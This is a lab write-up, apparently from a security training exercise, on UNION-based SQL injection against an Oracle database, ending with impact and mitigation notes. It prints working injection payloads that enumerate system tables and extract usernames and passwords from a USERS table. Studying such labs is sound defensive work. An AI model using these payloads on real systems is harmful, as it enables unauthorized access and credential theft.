# SQL Injection Attack: Listing the Database Contents on Oracle

## Overview

This lab demonstrates how UNION-based SQL Injection can be used to enumerate database contents on Oracle databases. Unlike MySQL and Microsoft SQL Server, Oracle stores metadata in different system tables. By querying these tables, it was possible to identify application tables, discover column names, and retrieve sensitive user credentials.

## Objective

Enumerate the Oracle database structure and retrieve administrator credentials from the users table.

## Vulnerability

The application was vulnerable to SQL Injection through the category parameter.

**Vulnerable Parameter:**

```http
/category?category=Gifts
```

The application directly incorporated user-controlled input into an SQL query without proper sanitization.

## Methodology

### Step 1: Determine the Number of Columns

The number of columns returned by the query was identified using ORDER BY testing.

**Payloads:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Observation

The first two payloads executed successfully, while increasing the column number eventually generated an error.

### Conclusion

The query returned two columns.

---

### Step 2: Identify Columns That Accept Text

**Payload:**

```sql
' UNION SELECT 'test',NULL FROM dual--
```

### Observation

The injected text appeared in the application's response.

### Conclusion

The first column accepted and displayed text values.

---

### Step 3: Enumerate Database Tables

Oracle stores metadata in the `ALL_TABLES` system table.

**Payload:**

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

### Observation

The application returned a list of table names.

### Conclusion

Database tables were successfully enumerated.

---

### Step 4: Identify the Users Table

Among the returned results, a table containing user account information was identified.

Example:

```text
USERS
```

---

### Step 5: Enumerate Column Names

Oracle stores column metadata within the `ALL_TAB_COLUMNS` system table.

**Payload:**

```sql
' UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USERS'--
```

### Observation

Column names belonging to the USERS table were displayed.

Example:

```text
USERNAME
PASSWORD
```

---

### Step 6: Retrieve User Credentials

**Payload:**

```sql
' UNION SELECT USERNAME,PASSWORD FROM USERS--
```

### Observation

The application returned usernames and passwords stored within the database.

Administrator credentials were successfully identified.

---

### Step 7: Log In as Administrator

The extracted administrator credentials were used to authenticate to the application.

## Result

Successfully retrieved administrator credentials and gained access to the administrator account.

## Why It Worked

The application directly concatenated user input into an SQL query. By exploiting UNION-based SQL Injection and querying Oracle's metadata tables (`ALL_TABLES` and `ALL_TAB_COLUMNS`), it was possible to discover the database structure, identify sensitive tables and columns, and retrieve stored user credentials.

## Impact

An attacker may be able to:

* Enumerate Oracle database objects
* Discover sensitive tables and columns
* Retrieve usernames and passwords
* Compromise privileged accounts
* Gain unauthorized access to the application

## Mitigation

* Use parameterized queries (prepared statements)
* Avoid constructing SQL queries using user input
* Restrict access to Oracle metadata tables where possible
* Apply the principle of least privilege to database accounts
* Perform regular security assessments and code reviews

## Key Concepts Learned

* UNION-Based SQL Injection
* Oracle Database Enumeration
* ALL_TABLES
* ALL_TAB_COLUMNS
* Table Discovery
* Column Discovery
* Credential Extraction

## Tools Used

* Burp Suite Repeater
* Browser Developer Tools

## Conclusion

This lab demonstrated how Oracle database metadata can be leveraged during a UNION-based SQL Injection attack. By querying Oracle's system tables, it was possible to enumerate the database structure, locate sensitive information, extract administrator credentials, and successfully compromise the application.
